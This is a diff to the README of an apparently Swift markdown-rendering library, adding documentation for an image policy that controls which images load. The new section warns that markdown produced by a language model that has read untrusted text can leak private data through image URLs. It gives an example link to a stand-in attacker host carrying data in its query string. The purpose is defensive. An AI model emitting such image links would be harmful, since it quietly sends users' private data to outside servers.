@@ -105,6 +105,8 @@ let view = GlimmerView(configuration: configuration)
   `GlimmerText`) to make images tappable: it is called with the image's URL and alt text.
   The default loader shares HTTP responses and prepared images across views, coalesces concurrent requests, and
   prepares images at their display size. See [Image caching](#image-caching) for budgets and custom sessions.
+- **`imagePolicy`** (`GlimmerImagePolicy`): decides which images load. `nil`, the default, loads every image. Set one
+  when the markdown is written by a language model or by other people. See [Image policy](#image-policy).
 - **`inlineImageShape`** (`GlimmerInlineImageShape`): `.circle` by default, cropping the image to fill the circle.
   Use `.roundedRectangle(cornerRadius: 3)` for the previous aspect-fitted appearance, or a radius of `0` for square
   corners. Applies to images inside text, including extension images; standalone images use the theme's styling.
@@ -154,6 +156,49 @@ Existing `GlimmerImageLoader` implementations continue to work. They can optiona
 `loadImage(for: GlimmerImageRequest)` to receive the target size in **pixels** and the fit/fill mode. Otherwise the
 default implementation calls `loadImage(from:)`. The built-in loader prepares thumbnails off the main thread,
 preserves aspect ratio and orientation, and never upscales. Circle clipping stays in the view.
+
+## Image policy
+
+Glimmer requests an image as soon as its text is laid out. When the markdown is written by a language model that has
+read untrusted text, or by another user, an image URL can carry private data to someone else's server
+(`![x](https://attacker.example/?d=…)`) or work as a tracking pixel. An image policy lets the app decide, for each
+image, whether Glimmer loads it:
+
+```swift
+struct AppImages: GlimmerImagePolicy {
+    func decision(for image: GlimmerImageCandidate) -> GlimmerImageDecision {
+        image.url.scheme == "https" && image.url.host() == "images.example.com" ? .load : .showAltText
+    }
+}
+
+let configuration = GlimmerConfiguration(imagePolicy: AppImages())
+```
+
+The policy receives a `GlimmerImageCandidate`: the image's `url`, `alt` text and `title`, and its `origin`. The origin
+is `.markdown` for an image written in the text, and `.extensionToken(kind:)` for one an extension produces, such as
+an emoji shortcode (its `kind` is `"emoji"`). The policy answers with one of:
+
+| Answer | What is shown |
+|---|---|
+| `.load` | The image, as without a policy. |
+| `.showAltText` | The alt text as ordinary text, styled like the text around it. An image with empty alt text shows nothing. An extension's image shows its token's text: `:octocat:` for an emoji shortcode. |
+| `.hide` | Nothing. |
+
+An image that is not loaded is never requested, from the network or from a cache, and reserves no space. A standalone
+image's alt text is an ordinary paragraph, and a paragraph left empty is left out. The text copies as what is shown,
+not as `![alt](url)`; it is not reported to `onImageTap`; and VoiceOver reads it as text.
+
+When writing a policy:
+
+- **Every image is asked about**, whatever its URL's scheme: relative names, `file:` and `data:` URLs too. Under a
+  policy, an image whose URL does not parse shows its alt text.
+- **A policy is a `Hashable` value.** Views with equal policies share composed answers, so two policies that compare
+  equal must decide equally. A struct with no stored properties, or with its allowed hosts as a property, gets this
+  for free.
+- **It is asked from any thread, and more than once for the same image**: each time the text is composed while an
+  answer streams. Answer quickly, and always the same.
+
+With no policy set, nothing changes.
 
 ## Extensions
 
